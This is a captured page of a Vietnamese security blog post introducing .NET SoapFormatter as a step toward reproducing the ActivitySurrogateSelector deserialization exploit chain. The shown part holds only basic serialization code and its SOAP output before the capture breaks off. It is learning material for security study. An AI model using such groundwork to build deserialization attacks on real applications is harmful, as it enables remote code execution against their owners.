    searchElem.addEventListener('keydown', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }

      if (e.key === 'Escape') {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      }

      var items = document.querySelectorAll('#search-menu .dropdown-item');
      var keyCode = e.which || e.keyCode;

      if (!items || !items.length) {
        return null;
      }
      
      if (e.key === 'ArrowDown' || keyCode === 40) {
        if (activeIndex === null) {
          activeIndex = 0;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
        }
        items[activeIndex].classList.add('is-active');

        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel > 0) {
          document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect().height;
        } else if (activeIndex === 0) {
          document.querySelector(".search-content").scrollTop = 0;
        }
      } else if (e.key === 'ArrowUp' || keyCode === 38) {
        if (activeIndex === null) {
          activeIndex = items.length - 1;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
        }
        items[activeIndex].classList.add('is-active');
        
        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel < 0) {
          document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect().height;
        } else {
          document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex].getBoundingClientRect().height;
        }
      } else if (e.key === 'Enter' || keyCode === 13) {
        if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
          location.href = items[activeIndex].getAttribute('href');
        }
      } else if (e.key === 'Escape' || keyCode === 27) {
        e.target.value = null;
        if (searchResults) {
          searchResults.classList.remove('is-active');
        }
      }
    }) : null;

    searchMobile ? 
    searchMobile.addEventListener('input', function(e) {
      if (!e.target.value) {
        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild);
        }
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      renderSearchResultsMobile(searchText, results);
      if (enableSearchHighlight) {
        renderSearchHighlightResultsMobile(searchText, results);
      } else {
        renderSearchResultsMobile(searchText, results);
      }
    }) : null;
  


  
    var mobileSearchInputElem = document.querySelector('#search-mobile');
    var mobileSearchClassElem = document.querySelector('.mobile-search');
    var mobileSearchBtnElems = document.querySelectorAll('.navbar-search');
    var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
    var mobileSearchContainer = document.querySelector('#search-mobile-container');
    var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
    var htmlElem = document.querySelector('html');

    if (mobileSearchClassElem) {
      mobileSearchClassElem.style.display = 'none';
    }

    mobileSearchBtnElems ? 
    mobileSearchBtnElems.forEach(function (elem, idx) {
      elem.addEventListener('click', function () {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'block';
        }

        if (mobileSearchInputElem) {
          mobileSearchInputElem.focus();
        }

        if (htmlElem) {
          htmlElem.style.overflowY = 'hidden';
        }
      });
    }) : null;

    mobileSearchCloseBtnElem ? 
    mobileSearchCloseBtnElem.addEventListener('click', function() {
      if (mobileSearchContainer) {
        mobileSearchContainer.style.display = 'none';
      }

      if (mobileSearchInputElem) {
        mobileSearchInputElem.value = '';
      }
      
      if (mobileSearchResultsElem) {
        while (mobileSearchResultsElem.firstChild) {
          mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
        }
      }

      if (htmlElem) {
        htmlElem.style.overflowY = 'visible';
      }
    }) : null;

    mobileSearchInputElem ?
    mobileSearchInputElem.addEventListener('keydown', function(e) {
      var keyCode = e.which || e.keyCode;
      if (e.key === 'Escape' || keyCode === 27) {
        if (mobileSearchContainer) {
          mobileSearchContainer.style.display = 'none';
        }
        
        if (mobileSearchInputElem) {
          mobileSearchInputElem.value = '';
        }

        if (mobileSearchResultsElem) {
          while (mobileSearchResultsElem.firstChild) {
            mobileSearchResultsElem.removeChild(mobileSearchResultsElem.firstChild);
          }
        }
        if (htmlElem) {
          htmlElem.style.overflowY = 'visible';
        }
      }
    }) : null;
  


  
    function renderSearchResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');
      
      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }

    function renderSearchHighlightResultsMain(searchText, results) {
      var searchBody = document.querySelector('.search-result__body');
      var originUl = searchBody.querySelector('ul');
      var ul = document.createElement('ul');

      if (!searchText) {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      } else if (results) {
        if (results && results.length) {
          results.forEach(function (result) {
            makeHighlightLi(ul, result);
          });

          searchResult ? searchResult.setAttribute('data-display', 'block') : null;
          summaryContainer ? summaryContainer.setAttribute('data-display', 'none') : null;
        }
      }

      originUl.parentNode.replaceChild(ul, originUl);
    }
  
  });
</script>
    
    


<link rel="stylesheet" href="/css/main.min.css">


    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-G6WT3WSKMH"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
    
      gtag('config', 'G-G6WT3WSKMH');
</script>
    <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@type": "WebPage",
    "headline": "[.NET deserialize] SoapFormatter:ActivitySurrogateSelector",
    "datePublished": "2023-06-28T00:00:00Z",
    "dateModified": "2023-06-28T00:00:00Z",
    "url" : "https://minhlongmt183.github.io/posts/dot_net_101_soapformatter_activitysurrogateselector/",
    "description": "Sau gần một tháng học về JavaDeserialize: học các khái niệm basic, reproduce các commonscollection thì lần này tôi có cơ hội tiếp xúc với .Net deserialize\nCũng là học các kiến thức basic và reproduce các chain kinh điển của .Net deserialize trên [先知社区 (aliyun.com)](https://xz.aliyun.com/u/12258) ",
    "keywords": ["C#"],
    "image" : "https://minhlongmt183.github.io/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/NET.png",
    "author": {
      "@type": "Person",
      "name": "Edisc"
    },
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https://minhlongmt183.github.io/"
    },
    "publisher": {
      "@type": "Organization",
      "name": "Edisc Blog",
      "url": "https://minhlongmt183.github.io/"
    }
  }
</script>

    
  
<script async src="https://www.googletagmanager.com/gtag/js?id=G-G6WT3WSKMH"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-G6WT3WSKMH', { 'anonymize_ip': false });
}
</script>

  
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-G6WT3WSKMH', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>








    <link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>

<body id="root" class="theme__dark">
    <script>
        var localTheme = localStorage.getItem('theme');
        if (localTheme) {
            document.getElementById('root').className = 'theme__' + localTheme;
        }
    </script>
    <div id="container">
        





        <div class="wrapper" data-type="posts" data-kind="page">
            <nav class="navbar scrolling" role="navigation" aria-label="main navigation" data-dir="ltr">
  <div class="navbar__brand">
    
    <a href="/" title="Home" rel="home" class="navbar__logo-link">
      <img src="/logo.png" alt="Home" class="navbar__logo">
    </a>
    
    
      <a href="/" title="Home" rel="home" class="navbar__title-link">
        <h6 class="navbar__title">Edisc</h6>
      </a>
    
  </div>

  
<div class="theme theme-mobile" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" style="" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          hacker
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          solarized
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          kimbie
        </a>
        
      
    </div>
  </div>
</div>


<div class="mobile-search__btn navbar-search" data-ani="true">
  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
</div>

<div id="search-mobile-container" class="mobile-search hide" data-dir="ltr">
  <div class="mobile-search__top">
    <input id="search-mobile" type="text" aria-label="Mobile Search" placeholder="Search" class="mobile-search__top--input"/>
    <div id="search-mobile-close" class="mobile-search__top--icon">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path opacity=".87" fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm3.59-13L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z"/></svg>
    </div>
  </div>
  <div id="search-mobile-results" class="mobile-search__body">
    
  </div>
</div>


<a role="button" class="navbar__burger" aria-label="menu" aria-expanded="false"
  data-ani="true">
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
  <span aria-hidden="true"></span>
</a>
<div class="navbarm__collapse" data-open="false">
  <ul dir="ltr">
    
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/about">About</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/archive">Archive</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item active">
          <a href="/posts">Posts</a>
        </li>
      
      
    
      
      
      
      

      
        <li class="navbarm__menu--item ">
          <a href="/contact">Contact</a>
        </li>
      
      
    

    
      <li class="navbarm__menu--item ">
        <a href="/tags" class="navbarm__menu--term" data-index="0">
          Tags
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/categories" class="navbarm__menu--term" data-index="1">
          Categories
        </a>
      </li>
    
      <li class="navbarm__menu--item ">
        <a href="/series" class="navbarm__menu--term" data-index="2">
          Series
        </a>
      </li>
    
  </ul>
</div>
  <div class="navbar__menu">
  
  
  
<div class="theme" data-ani="true">
  <div class="dropdown">
    <button class="dropdown-trigger navbar__slide-down" aria-label="Select Theme Button" data-ani="true">
      <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"><path fill="none" d="M24 0H0v24h24V0z"/><path fill="currentColor" d="M6.34 7.93c-3.12 3.12-3.12 8.19 0 11.31C7.9 20.8 9.95 21.58 12 21.58s4.1-.78 5.66-2.34c3.12-3.12 3.12-8.19 0-11.31l-4.95-4.95c-.39-.39-1.02-.39-1.41 0L6.34 7.93zM12 19.59c-1.6 0-3.11-.62-4.24-1.76C6.62 16.69 6 15.19 6 13.59s.62-3.11 1.76-4.24L12 5.1v14.49z"/></svg>      
    </button>
    <div class="dropdown-content select-theme">
      
        
        <a href="#" class="dropdown-item select-theme__item is-active">
          dark
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          light
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          hacker
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          solarized
        </a>
        
        <a href="#" class="dropdown-item select-theme__item ">
          kimbie
        </a>
        
      
    </div>
  </div>
</div>

  
  
  
  
  
  
  
  <a href="/about" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">About</a>
  
  
  
  
  
  
  
  <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
  
  
  
  
  
  
  
  <a href="/posts" class="navbar__menu-item navbar__slide-down active" dir="ltr" data-ani="true">Posts</a>
  
  
  
  
  
  
  
  <a href="/contact" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Contact</a>
  
  
</div>
</nav>
            
            

<main class="single__main main">
  
    <nav class="breadcrumb hide" aria-label="breadcrumbs">
  <script>document.querySelector('.breadcrumb').classList.remove('hide')</script>
  <ol>
    
  
  
  
  
  
  <li >
    
      <a href="https://minhlongmt183.github.io/" class="capitalize">Edisc Blog</a>
    
  </li>
  
  
  <li >
    
      <a href="https://minhlongmt183.github.io/posts/" class="capitalize">Posts</a>
    
  </li>
  
  
  <li  class="is-active" >
    
      <span>[.NET deserialize] SoapFormatter:ActivitySurrogateSelector</span>
    
  </li>
  
  </ol>
  
</nav>
  
  
  <div class="single ">
    <div class="single__nojs">This page looks best with JavaScript enabled</div>
    <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
    <h2 class="single__title" data-ani="true">[.NET deserialize] SoapFormatter:ActivitySurrogateSelector</h2>
    <h3 class="single__subtitle"></h3>
    <div class="single__meta">
      
<div class="single__infos">
  <time class="single__info" title="Written At">📅&nbsp;Jun 28, 2023 </time>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;33&nbsp;min read </span>
  
  &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">🐉&nbsp;Edisc</span>
  
  <span class="single__info">
    
  </span>
</div>

      
<ul class="single__tags caption">
  
  🏷️
  

  <li><a href="https://minhlongmt183.github.io/tags/c" class="single__tag" title="C#">#C#</a></li>

</ul>

    </div>
    <article class="single__contents" data-dir="ltr" data-ani="true">
      
      <h1 id="net-101-soapformatteractivitysurrogateselector">[.NET 101] SoapFormatter:ActivitySurrogateSelector</h1>
<hr />
<p>Sau gần một tháng học về JavaDeserialize: học các khái niệm basic, reproduce các commonscollection thì lần này tôi có cơ hội tiếp xúc với .Net deserialize. Nội dung cho newbie là học các kiến thức basic và reproduce các chain kinh điển của .Net deserialize trên <a href="https://xz.aliyun.com/u/12258">先知社区 (aliyun.com)</a></p>
<p>Khởi đầu khá thuận lợi với các bài:</p>
<ul>
<li><a href="https://xz.aliyun.com/t/9591">dotnet serialize 101</a></li>
<li><a href="https://xz.aliyun.com/t/9593">.net deserialization of BinaryFormatter</a></li>
<li><a href="https://xz.aliyun.com/t/9592">.net deserialized by XmlSerializer</a></li>
</ul>
<p>Nhìn chung là vì có kiến thức cơ bản từ PHP deserialize và Java deserialize nên ở mức độ 101 này không quá khó với tôi.</p>
<p>Nhưng đời không như mơ, đến với <strong><strong>SoapFormatter:ActivitySurrogateSelector</strong></strong> tôi đọc và làm trong 3 ngày và vẫn không hiểu được gì 😥😥😥😥. Do đó, tôi quyết định viết lại từng bước, từng câu hỏi và tự tìm hiểu, trả lời. Đây là một trong những phương pháp học của tôi: Ghi ra những điều mình không hiểu và tìm cách giải quyết từng bước một.</p>
<p>Vì là một con gà mới tiếp xúc với .Net deserialize chưa tới 2 tuần, nên nội dung bài blog này khá dài và những kiến thức cơ bản khá nhiều (không giành cho các profesional).</p>
<blockquote>
<p>Note:<br />
Để hiểu được chain exploit này, ta cần có một số kiến thức cơ bản nhất định mà tôi sẽ trình bày ở phần I,II,III, IV.</p>
</blockquote>
<h2 id="i-soapformatter">I <strong><strong>SoapFormatter</strong></strong></h2>
<ul>
<li>SoapFormatter tương tự với XmlSerializer, được dùng để tạo xml-based soap data streams.</li>
<li>Namespace nằm ở: <strong>System.Runtime.Serialization.Formatters.Soap</strong></li>
<li>Assembly ở: <strong>System.Runtime.Serialization.Formatters.Soap.dll</strong></li>
<li>SoapFormatter có thể serialize và deserialize toàn bộ một đồ thị các object (graph of objects) hoặc các objects kết nối với nhau dưới định dạng SOAP.</li>
<li>SoapFormatter implements IRemotingFormatter, IFormatter interfaces.</li>
<li>Sự khác biệt giữa SoapFormatter và BinaryFormatter là <em><strong>SoapFormatter không thể serialize một generic type trong khi BinaryFormatter không cần chỉ rõ type của serialized object trong quá trình deserialize.</strong></em></li>
<li>Trong bài này tôi sử dụng Visual Studio 2019, lí do vì phiên bản này hỗ trợ 1 extension <a href="https://marketplace.visualstudio.com/items?itemName=VladimirChirikov.GoToDnSpy">GoToDnSpy</a>.</li>
</ul>
<h2 id="ii-net-objects-và-soap-streams">II <strong><strong>.NET Objects và SOAP Streams</strong></strong></h2>
<ul>
<li>Chúng ta bắt đầu với đoạn code sau:</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Soap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">SoapDeserialization</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="na">    [Serializable]</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Person</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">int</span> <span class="n">age</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kd">private</span> <span class="kt">string</span> <span class="n">name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">int</span> <span class="n">Age</span> <span class="p">{</span> <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">age</span><span class="p">;</span> <span class="k">set</span> <span class="p">=&gt;</span> <span class="n">age</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">string</span> <span class="n">Name</span> <span class="p">{</span> <span class="k">get</span> <span class="p">=&gt;</span> <span class="n">name</span><span class="p">;</span> <span class="k">set</span> <span class="p">=&gt;</span> <span class="n">name</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="k">void</span> <span class="n">SayHello</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;hello from SayHello&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Program</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">SoapFormatter</span> <span class="n">soapFormatter</span> <span class="p">=</span> <span class="k">new</span> <span class="n">SoapFormatter</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">Person</span> <span class="n">person</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Person</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">person</span><span class="p">.</span><span class="n">Age</span> <span class="p">=</span> <span class="m">18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">person</span><span class="p">.</span><span class="n">Name</span> <span class="p">=</span> <span class="s">&#34;Edisc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">using</span> <span class="p">(</span><span class="n">MemoryStream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// serialize</span>
</span></span><span class="line"><span class="cl">                <span class="n">soapFormatter</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stream</span><span class="p">,</span> <span class="n">person</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="kt">string</span> <span class="n">soap</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">ToArray</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">soap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="s">&#34;========================================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1">// deserialize</span>
</span></span><span class="line"><span class="cl">                <span class="n">stream</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">Person</span> <span class="n">p</span> <span class="p">=</span> <span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">soapFormatter</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">Name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">Age</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">p</span><span class="p">.</span><span class="n">SayHello</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">Console</span><span class="p">.</span><span class="n">ReadKey</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Khi mới chạy khả năng sẽ bị thiếu thư viện <strong>System.Runtime.Serialization.Formatters.Soap.dll</strong> nên chương trình không thể thực thi</li>
</ul>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled.png"></p>
<ul>
<li>Để fix lỗi này, chúng ta cần tìm đến địa chỉ lưu trữ <strong>System.Runtime.Serialization.Formatters.Soap.dll</strong> rồi import thư viện này vào references.</li>
</ul>
<blockquote>
<p>Một tip ở đây là tìm các dll bằng cách search trên ổ C, sau đó import reference tại địa chỉ đó. Còn cách import thì tôi đã nói trong bài trước.</p>
</blockquote>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%201.png"></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%202.png"></p>
<p><img alt="Untitled" src="/images/posts/DOT_NET_101_SoapFormatter_ActivitySurrogateSelector/Untitled%203.png"></p>
<ul>
<li>
<p>Output như sau:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">SOAP</span><span class="p">-</span><span class="n">ENV</span><span class="p">:</span><span class="n">Envelope</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">xsi</span><span class="p">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">xsd</span><span class="p">=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema&#34;</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">SOAP</span><span class="p">-</span><span class="n">ENC</span><span class="p">=</span><span class="s">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">SOAP</span><span class="p">-</span><span class="n">ENV</span><span class="p">=</span><span class="s">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">clr</span><span class="p">=</span><span class="s">&#34;http://schemas.microsoft.com/soap/encoding/clr/1.0&#34;</span> <span class="n">SOAP</span><span class="p">-</span><span class="n">ENV</span><span class="p">:</span><span class="n">encodingStyle</span><span class="p">=</span><span class="s">&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">SOAP</span><span class="p">-</span><span class="n">ENV</span><span class="p">:</span><span class="n">Body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">a1</span><span class="p">:</span><span class="n">Person</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;ref-1&#34;</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">a1</span><span class="p">=</span><span class="s">&#34;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/ActivitySurrogateSelectorChain%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Dnull&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">age</span><span class="p">&gt;</span><span class="m">18</span><span class="p">&lt;/</span><span class="n">age</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="n">name</span> <span class="n">id</span><span class="p">=</span><span class="s">&#34;ref-3&#34;</span><span class="p">&gt;</span><span class="n">Edisc</span><span class="p">&lt;/</span><span class="n">name</span><span class="p">&gt;</span>
